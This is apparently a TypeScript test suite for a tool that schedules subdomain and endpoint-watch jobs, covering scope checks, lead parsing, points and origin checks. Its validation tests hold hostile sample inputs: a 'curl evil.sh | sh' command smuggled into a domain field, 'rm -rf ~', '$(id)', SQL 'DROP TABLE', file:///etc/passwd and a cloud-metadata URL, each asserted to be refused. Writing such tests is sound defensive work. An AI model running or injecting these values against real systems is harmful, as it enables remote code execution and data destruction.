import { describe, expect, it } from 'bun:test';
import express from 'express';
import type { Server } from 'http';
import type { AddressInfo } from 'net';
import {
  cleanHost, cleanParam, cleanScopePattern, DAILY_LOSS_CAP, hostInScope, isAnnealerJobId, jobFailing, jobIdFor, LEADS_PER_RUN, levelFor, parseLeads, pointsOf,
} from '../../src/shared/annealer/companions.js';
import { ASK_GIVEN_UP_MS, AssignRefused, CLAUDE_COMMAND, CompanionService } from '../../src/services/annealer/companions.js';
import { CronLordClient, LOG_READ_MAX_BYTES, readCronLordConfig } from '../../src/services/annealer/cronlord.js';
import { parseRitual, RITUAL_FILES, rituals } from '../../src/services/annealer/rituals.js';
import { AnnealerStore, TRAIL_KEPT } from '../../src/services/annealer/store.js';
import { AnnealerRoutes } from '../../src/services/worker/http/routes/AnnealerRoutes.js';
import { mkdtempSync, rmSync, writeFileSync, chmodSync, mkdirSync } from 'fs';
import { tmpdir } from 'os';
import { join } from 'path';

const NOW = '2026-11-19T10:00:00.000Z';

describe('leads in a run log', () => {
  it('reads only what the job printed to stdout, never the line that echoes the command', () => {
    const log = [
      'data: 2026-11-19T08:45:39Z meta $ echo "ANNEALER-LEAD change $X"', '',
      'data: 2026-11-19T08:45:39Z stdout hi', '',
      'data: 2026-11-19T08:45:39Z stdout ANNEALER-LEAD asset new.example.com', '',
      'data: 2026-11-19T08:45:39Z stderr ANNEALER-LEAD asset from-stderr.example.com', '',
      'data: 2026-11-19T08:45:39Z stdout ANNEALER-LEAD asset new.example.com', '',
      'data: 2026-11-19T08:45:39Z stdout ANNEALER-LEAD rumour not a kind', '',
      'event: end', 'data: success',
    ].join('\n');
    expect(parseLeads(log)).toEqual({ leads: [{ kind: 'asset', text: 'new.example.com' }], dropped: 0 });
  });

  it('strips control characters, cuts long text and stops at the per-run limit', () => {
    const noisy = parseLeads(`t stdout ANNEALER-LEAD note a\u001b[31mred\u0007 ${'x'.repeat(500)}`);
    expect(noisy.leads[0].text.startsWith('a [31mred x')).toBe(true);
    expect(noisy.leads[0].text.length).toBe(300);
    const many = parseLeads(Array.from({ length: LEADS_PER_RUN + 7 }, (_, index) => `t stdout ANNEALER-LEAD asset h${index}.example.com`).join('\n'));
    expect(many.leads.length).toBe(LEADS_PER_RUN);
    expect(many.dropped).toBe(7);
  });
});

describe('scope and parameters', () => {
  it('accepts plain DNS names only', () => {
    expect(cleanHost(' Example.COM. ')).toBe('example.com');
    for (const bad of ['localhost', '127.0.0.1', 'a b.com', 'ex ample.com', 'example.com/path', 'example.com:8080', '$(id).example.com', '-x.example.com', '', null]) expect(cleanHost(bad)).toBeNull();
  });

  it('matches an exact host or a wildcard, and refuses a wildcard over a whole suffix', () => {
    expect(cleanScopePattern('*.Example.com')).toBe('*.example.com');
    expect(cleanScopePattern('*.com')).toBeNull();
    expect(cleanScopePattern('*')).toBeNull();
    expect(hostInScope('app.example.com', ['example.com'])).toBe(false);
    expect(hostInScope('example.com', ['example.com'])).toBe(true);
    expect(hostInScope('a.b.example.com', ['*.example.com'])).toBe(true);
    expect(hostInScope('example.com', ['*.example.com'])).toBe(true);
    expect(hostInScope('notexample.com', ['*.example.com'])).toBe(false);
    expect(hostInScope('example.com.evil.net', ['*.example.com'])).toBe(false);
  });

  it('cleans an address and refuses anything that is not plain http or https on a named host', () => {
    expect(cleanParam('url', 'https://app.example.com/main.js?v=1')).toEqual({ value: 'https://app.example.com/main.js?v=1', host: 'app.example.com' });
    for (const bad of ['file:///etc/passwd', 'javascript:alert(1)', 'https://user:pw@example.com/', 'http://127.0.0.1/', 'http://[::1]/', 'http://169.254.169.254/latest', 'http://localhost:7070/jobs', 'example.com']) expect(cleanParam('url', bad)).toBeNull();
    expect(cleanParam('domain', 'example.com; rm -rf ~')).toBeNull();
  });

  it('names a job after its creature, ritual and parameters', () => {
    const id = jobIdFor('moth', 'subdomain-watch', { TARGET: 'example.com' });
    expect(id).toMatch(/^annealer-moth-subdomain-watch-[0-9a-f]{8}$/);
    expect(isAnnealerJobId(id)).toBe(true);
    expect(jobIdFor('moth', 'subdomain-watch', { TARGET: 'example.org' })).not.toBe(id);
    expect(isAnnealerJobId('nightly-backup')).toBe(false);
    expect(isAnnealerJobId('annealer-moth-x-00000000/../../jobs')).toBe(false);
  });
});

describe('a creature\'s points', () => {
  it('uses the Grove\'s curve', () => {
    expect(levelFor(0).level).toBe(1);
    expect(levelFor(50).level).toBe(2);
    expect(levelFor(2250).level).toBe(10);
  });

  it('caps a day\'s losses and never goes below zero', () => {
    expect(pointsOf([{ at: NOW, points: 5 }, { at: NOW, points: -2 }])).toBe(3);
    expect(pointsOf([{ at: NOW, points: -2 }])).toBe(0);
    const badDay = Array.from({ length: 50 }, () => ({ at: '2026-11-20T09:00:00.000Z', points: -2 }));
    expect(pointsOf([{ at: NOW, points: 500 }, ...badDay])).toBe(500 - DAILY_LOSS_CAP);
  });

  it('calls a job failing only after two bad runs in a row', () => {
    expect(jobFailing({ recent: [{ status: 'fail', at: null }] })).toBe(false);
    expect(jobFailing({ recent: [{ status: 'timeout', at: null }, { status: 'fail', at: null }] })).toBe(true);
    expect(jobFailing({ recent: [{ status: 'success', at: null }, { status: 'fail', at: null }, { status: 'fail', at: null }] })).toBe(false);
  });
});

describe('rituals', () => {
  it('loads every shipped ritual, each owned by a creature and with a parameter', () => {
    expect([...rituals().keys()].sort()).toEqual(['challenge', 'endpoint-watch', 'hypotheses', 'report-draft', 'script-endpoints', 'subdomain-watch']);
    expect(rituals().size).toBe(RITUAL_FILES.length);
    expect(rituals().get('endpoint-watch')!.ritual).toMatchObject({ owner: 'bolt', reach: 'touch', lead: 'change' });
    expect(rituals().get('subdomain-watch')!.ritual).toMatchObject({ owner: 'moth', reach: 'read', lead: 'asset' });
  });

  it('never builds a command from a parameter: every one is read from the environment', () => {
    for (const { ritual, job } of rituals().values()) {
      if (job.runner !== 'shell') continue;
      for (const param of ritual.params) {
        expect(job.command).toContain(`"$${param.name}"`);
        expect(param.type).not.toBe('text');
      }
      expect(job.command).not.toMatch(/eval|dangerously|\bclaude\b/);
    }
    // The one command that does call Claude takes every tool away and quotes everything it was handed.
    expect(CLAUDE_COMMAND).toContain('--tools ""');
    expect(CLAUDE_COMMAND).toContain('--strict-mcp-config');
    expect(CLAUDE_COMMAND).not.toMatch(/dangerously|bypassPermissions|eval/);
    for (const name of ['ANNEALER_PROMPT', 'ANNEALER_SOUL', 'ANNEALER_MODEL']) expect(CLAUDE_COMMAND).toContain(`"$${name}"`);
  });

  it('refuses a file with no annealer table, a model job, or a parameter it would not check', () => {
    expect(parseRitual('[[jobs]]\nid = "x"\nschedule = "* * * * *"\ncommand = "true"\nkind = "shell"')).toBeNull();
    const base = (extra: string, kind = 'shell') => `[annealer]\nowner = "bolt"\nreach = "read"\nlead = "note"\n${extra}\n[[jobs]]\nid = "x"\ncommand = "true"\nkind = "${kind}"`;
    expect(parseRitual(base('[[annealer.params]]\nname = "TARGET"\ntype = "domain"'))).not.toBeNull();
    expect(parseRitual(base('[[annealer.params]]\nname = "TARGET"\ntype = "domain"', 'claude'))).toBeNull();
    expect(parseRitual(base('[[annealer.params]]\nname = "TARGET"\ntype = "anything"'))).toBeNull();
    expect(parseRitual(base('[[annealer.params]]\nname = "ANNEALER_JOB"\ntype = "domain"'))).toBeNull();
    expect(parseRitual(base(''))).toBeNull();
    // Free text is for a model to read. A shell ritual may not ask for any.
    expect(parseRitual(base('[[annealer.params]]\nname = "NOTES"\ntype = "text"'))).toBeNull();
    // A model ritual says what it reads and how it answers, and is written as a Claude job.
    const model = (extra: string, kind = 'claude') => `[annealer]\nowner = "cinder"\nreach = "read"\nlead = "hypothesis"\nrunner = "model"\n${extra}\n[[annealer.params]]\nname = "NOTES"\ntype = "text"\n[[jobs]]\nid = "x"\ncommand = "think"\nkind = "${kind}"`;
    expect(parseRitual(model('answer = "list"'))?.job).toMatchObject({ runner: 'model', task: 'think', answer: 'list' });
    expect(parseRitual(model('answer = "list"', 'shell'))).toBeNull();
    expect(parseRitual(model('answer = "essay"'))).toBeNull();
    expect(parseRitual(model('answer = "list"\nreads = "everything"'))).toBeNull();
    expect(parseRitual('not toml [')).toBeNull();
  });
});

describe('the store', () => {
  const job = { id: 'annealer-moth-subdomain-watch-00000001', species: 'moth' as const, ritual: 'subdomain-watch', target: 'example.com', schedule: 'daily' as const, branchId: 'focus-1' };

  it('saves a run\'s leads once', () => {
    const store = new AnnealerStore(':memory:');
    store.saveJob(job, NOW);
    expect(store.addLeads(job, 'run-1', [{ kind: 'asset', text: 'a.example.com' }, { kind: 'asset', text: 'b.example.com' }], NOW)).toBe(2);
    expect(store.addLeads(job, 'run-1', [{ kind: 'asset', text: 'a.example.com' }], NOW)).toBe(0);
    expect(store.leads().map((lead) => lead.text).sort()).toEqual(['a.example.com', 'b.example.com']);
  });

  it('pays a creature for a kept lead, charges it for a dismissed one, and takes either back', () => {
    const store = new AnnealerStore(':memory:');
    store.saveJob(job, NOW);
    store.addLeads(job, 'run-1', [{ kind: 'asset', text: 'a.example.com' }], NOW);
    const [lead] = store.leads();
    expect(store.decideLead(lead.id, 'kept', NOW)?.status).toBe('kept');
    expect(store.ledger().moth).toEqual([{ at: NOW, points: 5 }]);
    // Kept, on a job with a branch: it is on that branch's trail.
    expect(store.trail()).toMatchObject([{ branchId: 'focus-1', text: 'example.com: a.example.com', done: false }]);
    expect(store.decideLead(lead.id, 'kept', NOW)?.status).toBe('kept');
    expect(store.ledger().moth.length).toBe(1);
    expect(store.trail().length).toBe(1);
    store.decideLead(lead.id, 'dismissed', NOW);
    expect(store.ledger().moth).toEqual([{ at: NOW, points: -2 }]);
    expect(store.trail()).toEqual([]);
    store.decideLead(lead.id, 'new', NOW);
    expect(store.ledger().moth).toEqual([]);
    expect(store.decideLead('999', 'kept', NOW)).toBeNull();
    expect(store.decideLead('1; DROP TABLE lead', 'kept', NOW)).toBeNull();
  });

  it('keeps a lead and its points when its job is removed', () => {
    const store = new AnnealerStore(':memory:');
    store.saveJob(job, NOW);
    store.addLeads(job, 'run-1', [{ kind: 'asset', text: 'a.example.com' }], NOW);
    store.decideLead(store.leads()[0].id, 'kept', NOW);
    store.removeJob(job.id);
    expect(store.jobs()).toEqual([]);
    expect(store.leads()[0]).toMatchObject({ jobId: null, status: 'kept' });
    expect(store.ledger().moth.length).toBe(1);
  });

  it('keeps trail notes the owner wrote, cleans them, and says when it is full', () => {
    const store = new AnnealerStore(':memory:');
    const result = store.addNotes([
      { id: 'note-0001', branchId: 'focus-1', text: '  retest   the upload  ', link: 'javascript:alert(1)', remindOn: '2026-12-01' },
      { id: 'note-0002', branchId: 'focus-1', text: 'ok', link: 'https://example.com/a' },
      { id: 'note-0001', branchId: 'focus-1', text: 'same id again' },
      { id: 'lead-7', branchId: 'focus-1', text: 'pretends to come from a lead' },
      { id: 'x', branchId: 'focus-1', text: 'id too short' },
      { id: 'note-0003', branchId: 'focus-1', text: '   ' },
    ], NOW);
    expect(result).toEqual({ added: 2, full: false });
    expect(store.trail()).toMatchObject([
      { id: 'note-0001', text: 'retest the upload', link: null, remindOn: '2026-12-01', done: false },
      { id: 'note-0002', link: 'https://example.com/a' },
    ]);
    store.setNoteDone('note-0001', true);
    store.removeNote('note-0002');
    expect(store.trail()).toMatchObject([{ id: 'note-0001', done: true }]);
    const flood = Array.from({ length: TRAIL_KEPT + 5 }, (_, index) => ({ id: `flood-${String(index).padStart(5, '0')}`, branchId: 'b', text: 'n' }));
    expect(store.addNotes(flood, NOW)).toEqual({ added: TRAIL_KEPT - 1, full: true });
  });
});

/** A CronLord that exists only in this test: it records what it was asked and answers from `runs` and `logs`. */
function fakeCronLord(options: { token?: string; down?: () => boolean; localModelUrl?: string } = {}) {
  const calls: { method: string; path: string; body: Record<string, unknown> | null; auth: string | null }[] = [];
  const jobs = new Map<string, Record<string, unknown>>();
  const runs = new Map<string, { id: string; job_id: string; status: string; started_at: number; finished_at: number | null }[]>();
  const logs = new Map<string, string>();
  const fetchImpl = async (input: string, init: RequestInit = {}): Promise<Response> => {
    const url = new URL(input);
    const headers = (init.headers ?? {}) as Record<string, string>;
    const method = init.method ?? 'GET';
    calls.push({ method, path: url.pathname + url.search, body: typeof init.body === 'string' ? JSON.parse(init.body) : null, auth: headers.Authorization ?? null });
    if (options.down?.()) throw new Error('connection refused');
    if (url.pathname === '/healthz') return Response.json({ status: 'ok', version: '0.3.6' });
    if (options.token && headers.Authorization !== `Bearer ${options.token}`) return Response.json({ error: 'unauthorized' }, { status: 401 });
    if (url.pathname === '/api/jobs' && method === 'GET') return Response.json([...jobs.values()]);
    if (url.pathname === '/api/jobs' && method === 'POST') { const body = JSON.parse(String(init.body)); jobs.set(body.id, body); return Response.json(body, { status: 201 }); }
    if (url.pathname === '/api/runs') return Response.json(runs.get(url.searchParams.get('job_id') ?? '') ?? []);
    const log = /^\/api\/runs\/([^/]+)\/log$/.exec(url.pathname);
    if (log) return new Response(logs.get(log[1]) ?? '', { headers: { 'Content-Type': 'text/event-stream' } });
    const job = /^\/api\/jobs\/([^/]+)(\/run)?$/.exec(url.pathname);
    if (job && method === 'DELETE') return jobs.delete(job[1]) ? Response.json({ deleted: true }) : Response.json({ error: 'not found' }, { status: 404 });
    if (job && method === 'POST') return Response.json({ id: 'r', status: 'queued' }, { status: 202 });
    return Response.json({ error: 'not found' }, { status: 404 });
  };
  return { calls, jobs, runs, logs, client: new CronLordClient({ url: 'http://cronlord.test:7070', token: options.token ?? null, localModelUrl: options.localModelUrl ?? null }, fetchImpl) };
}

describe('giving a creature a job', () => {
  const setup = (options: Parameters<typeof fakeCronLord>[0] = { token: 'secret' }) => {
    const cronlord = fakeCronLord(options);
    const store = new AnnealerStore(':memory:');
    return { cronlord, store, service: new CompanionService(store, () => cronlord.client, () => new Date(NOW)) };
  };

  it('creates the job in CronLord with the ritual\'s own command and the parameter in the environment', async () => {
    const { cronlord, store, service } = setup();
    const job = await service.assign({ species: 'moth', ritual: 'subdomain-watch', params: { TARGET: 'Example.com' }, schedule: 'daily', branchId: 'focus-1' });
    const sent = cronlord.calls.find((call) => call.method === 'POST')!;
    expect(sent.auth).toBe('Bearer secret');
    expect(sent.body).toMatchObject({
      id: job.id, category: 'annealer', kind: 'shell', schedule: '7 5 * * *', retry_count: 0, max_concurrent: 1, executor: 'local',
      command: rituals().get('subdomain-watch')!.job.command, env: { TARGET: 'example.com', ANNEALER_JOB: job.id },
    });
    expect(String(sent.body!.command)).not.toContain('example.com');
    expect(store.jobs()).toMatchObject([{ id: job.id, species: 'moth', target: 'example.com', branchId: 'focus-1' }]);
  });

  it('refuses a ritual that touches a host outside the scope list, before CronLord hears of it', async () => {
    const { cronlord, store, service } = setup();
    const ask = () => service.assign({ species: 'bolt', ritual: 'endpoint-watch', params: { URL: 'https://app.example.com/main.js' }, schedule: 'six-hourly', branchId: null });
    await expect(ask()).rejects.toThrow(AssignRefused);
    expect(cronlord.calls).toEqual([]);
    store.addScope('*.example.com', NOW);
    expect((await ask()).target).toBe('https://app.example.com/main.js');
  });

  it('refuses another creature\'s ritual, an unknown ritual and a parameter that is not what it should be', async () => {
    const { cronlord, service } = setup();
    await expect(service.assign({ species: 'bolt', ritual: 'subdomain-watch', params: { TARGET: 'example.com' }, schedule: 'daily', branchId: null })).rejects.toThrow(AssignRefused);
    await expect(service.assign({ species: 'moth', ritual: 'rm-rf', params: {}, schedule: 'daily', branchId: null })).rejects.toThrow(AssignRefused);
    await expect(service.assign({ species: 'moth', ritual: 'subdomain-watch', params: { TARGET: 'example.com; curl evil.sh | sh' }, schedule: 'daily', branchId: null })).rejects.toThrow(AssignRefused);
    await expect(service.assign({ species: 'moth', ritual: 'subdomain-watch', params: { TARGET: ['example.com'] }, schedule: 'daily', branchId: null })).rejects.toThrow(AssignRefused);
    expect(cronlord.calls).toEqual([]);
  });

  it('does not remember a job CronLord would not take', async () => {
    const { store, service } = setup({ token: 'right' });
    const wrong = new CompanionService(store, () => new CronLordClient({ url: 'http://cronlord.test:7070', token: 'wrong', localModelUrl: null }, fakeCronLord({ token: 'right' }).client['fetchImpl']), () => new Date(NOW));
    await expect(wrong.assign({ species: 'moth', ritual: 'subdomain-watch', params: { TARGET: 'example.com' }, schedule: 'daily', branchId: null })).rejects.toThrow('401');
    expect(store.jobs()).toEqual([]);
    expect((await service.state()).cronlord.state).toBe('connected');
  });
});

describe('reading runs back', () => {
  const lead = (text: string) => `data: t stdout ANNEALER-LEAD asset ${text}\n\n`;

  it('saves the leads of finished runs it has not read, oldest first, and reads none of them twice', async () => {
    const cronlord = fakeCronLord();
    const store = new AnnealerStore(':memory:');
    const service = new CompanionService(store, () => cronlord.client, () => new Date(NOW));
    const job = await service.assign({ species: 'moth', ritual: 'subdomain-watch', params: { TARGET: 'example.com' }, schedule: 'daily', branchId: null });
    cronlord.runs.set(job.id, [
      { id: 'r3', job_id: job.id, status: 'running', started_at: 300, finished_at: null },
      { id: 'r2', job_id: job.id, status: 'success', started_at: 200, finished_at: 201 },
      { id: 'r1', job_id: job.id, status: 'fail', started_at: 100, finished_at: 101 },
      { id: 'other', job_id: 'someone-elses-job', status: 'success', started_at: 50, finished_at: 51 },
    ]);
    cronlord.logs.set('r2', lead('a.example.com') + lead('b.example.com'));
    cronlord.logs.set('r1', lead('printed-by-a-failed-run.example.com'));
    cronlord.logs.set('other', lead('not-ours.example.com'));
    expect(await service.sync()).toEqual({ added: 2, failed: 0 });
    expect(store.leads().map((entry) => entry.text).sort()).toEqual(['a.example.com', 'b.example.com']);
    expect(store.jobs()[0].recent.map((run) => run.status)).toEqual(['success', 'fail']);

    const logReads = () => cronlord.calls.filter((call) => call.path.endsWith('/log')).length;
    const before = logReads();
    expect(await service.sync()).toEqual({ added: 0, failed: 0 });
    expect(logReads()).toBe(before);

    cronlord.runs.get(job.id)![0] = { id: 'r3', job_id: job.id, status: 'success', started_at: 300, finished_at: 301 };
    cronlord.logs.set('r3', lead('c.example.com'));
    expect(await service.sync()).toEqual({ added: 1, failed: 0 });
    expect(logReads()).toBe(before + 1);
  });

  it('after an outage asks CronLord for nothing but what it would have asked anyway', async () => {
    let down = false;
    const cronlord = fakeCronLord({ down: () => down });
    const store = new AnnealerStore(':memory:');
    const service = new CompanionService(store, () => cronlord.client, () => new Date(NOW));
    const job = await service.assign({ species: 'moth', ritual: 'subdomain-watch', params: { TARGET: 'example.com' }, schedule: 'daily', branchId: null });
    down = true;
    expect(await service.sync()).toEqual({ added: 0, failed: 1 });
    expect((await service.state()).cronlord.state).toBe('unreachable');
    down = false;
    cronlord.calls.length = 0;
    await service.sync();
    // Reading only: no job is created again, and none is started to make up for the gap.
    expect(cronlord.calls.map((call) => `${call.method} ${call.path.split('?')[0]}`)).toEqual(['GET /api/runs']);
    expect(store.jobs().map((entry) => entry.id)).toEqual([job.id]);
  });

  it('stops asking after the first job gets no answer at all, and counts the rest as unread', async () => {
    let down = false;
    const cronlord = fakeCronLord({ down: () => down });
    const store = new AnnealerStore(':memory:');
    const service = new CompanionService(store, () => cronlord.client, () => new Date(NOW));
    for (const target of ['a.example.com', 'b.example.com', 'c.example.com']) await service.assign({ species: 'moth', ritual: 'subdomain-watch', params: { TARGET: target }, schedule: 'daily', branchId: null });
    down = true;
    cronlord.calls.length = 0;
    expect(await service.sync()).toEqual({ added: 0, failed: 3 });
    expect(cronlord.calls.length).toBe(1);
  });

  it('stops reading a log at the limit and drops the cut-off line', async () => {
    const cronlord = fakeCronLord();
    const line = lead('h.example.com');
    cronlord.logs.set('big', line.repeat(Math.ceil((LOG_READ_MAX_BYTES * 3) / line.length)));
    const text = await cronlord.client.log('big');
    expect(text.length).toBeLessThanOrEqual(LOG_READ_MAX_BYTES * 3);
    expect(text.endsWith('\n')).toBe(true);
  });

  it('says when CronLord takes requests with no token', async () => {
    expect(await fakeCronLord().client.status()).toMatchObject({ state: 'connected', open: true, version: '0.3.6' });
    expect(await fakeCronLord({ token: 'secret' }).client.status()).toMatchObject({ state: 'connected', open: false });
    const wrong = fakeCronLord({ token: 'secret' });
    expect(await new CronLordClient({ url: 'http://cronlord.test:7070', token: 'nope', localModelUrl: null }, wrong.client['fetchImpl']).status()).toMatchObject({ state: 'refused' });
  });
});

describe('where CronLord is', () => {
  it('reads the environment first, then the file, and refuses a token file others can read', () => {
    const dir = mkdtempSync(join(tmpdir(), 'annealer-cronlord-'));
    try {
      expect(readCronLordConfig(dir, {})).toBeNull();
      expect(readCronLordConfig(dir, { ANNEALER_CRONLORD_URL: 'http://127.0.0.1:7070/jobs', ANNEALER_CRONLORD_TOKEN: ' t ' })).toEqual({ url: 'http://127.0.0.1:7070', token: 't', localModelUrl: null });
      expect(readCronLordConfig(dir, { ANNEALER_CRONLORD_URL: 'http://127.0.0.1:7070', ANNEALER_LOCAL_MODEL_URL: 'http://127.0.0.1:1234/v1/' })?.localModelUrl).toBe('http://127.0.0.1:1234/v1');
      expect(readCronLordConfig(dir, { ANNEALER_CRONLORD_URL: 'http://127.0.0.1:7070', ANNEALER_LOCAL_MODEL_URL: 'http://user:pw@127.0.0.1:1234/v1' })?.localModelUrl).toBeNull();
      expect(readCronLordConfig(dir, { ANNEALER_CRONLORD_URL: 'file:///etc/passwd' })).toBeNull();
      mkdirSync(join(dir, 'annealer'));
      const file = join(dir, 'annealer', 'cronlord.json');
      writeFileSync(file, JSON.stringify({ url: 'https://cron.example.net', token: 'secret' }), { mode: 0o644 });
      chmodSync(file, 0o644);
      expect(readCronLordConfig(dir, {})).toBeNull();
      chmodSync(file, 0o600);
      expect(readCronLordConfig(dir, {})).toEqual({ url: 'https://cron.example.net', token: 'secret', localModelUrl: null });
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });
});

describe('the companion routes', () => {
  const start = async () => {
    const cronlord = fakeCronLord({ token: 'secret' });
    const store = new AnnealerStore(':memory:');
    const app = express();
    app.use(express.json());
    new AnnealerRoutes(() => '/nonexistent', { store, companions: new CompanionService(store, () => cronlord.client, () => new Date(NOW)) }).setupRoutes(app);
    const server = await new Promise<Server>((resolve) => { const started = app.listen(0, '127.0.0.1', () => resolve(started)); });
    const base = `http://127.0.0.1:${(server.address() as AddressInfo).port}`;
    const send = (path: string, method: string, body?: unknown, headers: Record<string, string> = {}) =>
      fetch(`${base}${path}`, { method, headers: { 'Content-Type': 'application/json', ...headers }, body: body === undefined ? undefined : JSON.stringify(body) });
    return { cronlord, store, base, send, stop: () => new Promise((resolve) => server.close(resolve)) };
  };

  it('assigns, lists, decides a lead and removes, from the worker\'s own page', async () => {
    const { cronlord, store, send, stop } = await start();
    try {
      const made = await send('/api/annealer/jobs', 'POST', { species: 'moth', ritual: 'subdomain-watch', params: { TARGET: 'example.com' }, schedule: 'daily', branchId: 'focus-1' });
      expect(made.status).toBe(201);
      const { job } = await made.json() as { job: { id: string } };
      cronlord.runs.set(job.id, [{ id: 'r1', job_id: job.id, status: 'success', started_at: 1, finished_at: 2 }]);
      cronlord.logs.set('r1', 'data: t stdout ANNEALER-LEAD asset a.example.com\n\n');
      const synced = await (await send('/api/annealer/companions/sync', 'POST')).json() as { added: number; state: { leads: { id: string }[]; cronlord: { state: string } } };
      expect(synced.added).toBe(1);
      expect(synced.state.cronlord.state).toBe('connected');
      const decided = await (await send(`/api/annealer/leads/${synced.state.leads[0].id}`, 'POST', { status: 'kept' })).json() as { ledger: { moth: unknown[] } };
      expect(decided.ledger.moth.length).toBe(1);
      expect((await (await send('/api/annealer/trail', 'GET')).json() as { notes: unknown[] }).notes.length).toBe(1);
      expect((await send(`/api/annealer/jobs/${job.id}/run`, 'POST')).status).toBe(202);
      expect((await send(`/api/annealer/jobs/${job.id}`, 'DELETE')).status).toBe(200);
      expect(store.jobs()).toEqual([]);
      expect(cronlord.jobs.size).toBe(0);
      expect((await send('/api/annealer/jobs/annealer-moth-x-00000000', 'DELETE')).status).toBe(404);
      expect((await send('/api/annealer/jobs/nightly-backup/run', 'POST')).status).toBe(404);
    } finally { await stop(); }
  });

  it('says why in words when a job is refused, and that the trouble is CronLord when it is', async () => {
    const { send, stop } = await start();
    try {
      const refused = await send('/api/annealer/jobs', 'POST', { species: 'bolt', ritual: 'endpoint-watch', params: { URL: 'https://app.example.com/' }, schedule: 'daily' });
      expect(refused.status).toBe(400);
      expect((await refused.json() as { message: string }).message).toContain('scope list');
      expect((await send('/api/annealer/jobs', 'POST', { species: 'wolf', ritual: 'x', schedule: 'daily' })).status).toBe(400);
      expect((await send('/api/annealer/jobs', 'POST', { species: 'moth', ritual: 'subdomain-watch', params: { TARGET: 'example.com' }, schedule: '* * * * *' })).status).toBe(400);
      expect((await send('/api/annealer/scope', 'POST', { pattern: '*.com' })).status).toBe(400);
      expect((await send('/api/annealer/scope', 'POST', { pattern: '*.example.com' })).status).toBe(201);
      expect((await send('/api/annealer/leads/1', 'POST', { status: 'promoted' })).status).toBe(400);
    } finally { await stop(); }
  });

  it('refuses every write from a page on another site or another local port, and a form post is not read as JSON', async () => {
    const { cronlord, store, base, send, stop } = await start();
    try {
      const job = { species: 'moth', ritual: 'subdomain-watch', params: { TARGET: 'example.com' }, schedule: 'daily' };
      for (const origin of ['https://example.com', 'http://localhost:5173', 'null']) {
        expect((await send('/api/annealer/jobs', 'POST', job, { Origin: origin })).status).toBe(403);
        expect((await send('/api/annealer/scope', 'POST', { pattern: 'example.com' }, { Origin: origin })).status).toBe(403);
        expect((await send('/api/annealer/trail', 'POST', { notes: [{ id: 'note-0001', branchId: 'b', text: 'x' }] }, { Origin: origin })).status).toBe(403);
        expect((await send('/api/annealer/companions', 'GET', undefined, { Origin: origin })).status).toBe(403);
      }
      // What a cross-site form can send without a preflight: no JSON content type, so nothing is parsed.
      const form = await fetch(`${base}/api/annealer/jobs`, { method: 'POST', headers: { 'Content-Type': 'text/plain' }, body: JSON.stringify(job) });
      expect(form.status).toBe(400);
      expect(cronlord.calls.filter((call) => call.method === 'POST')).toEqual([]);
      expect(store.jobs()).toEqual([]);
      expect(store.scope()).toEqual([]);
    } finally { await stop(); }
  });
});
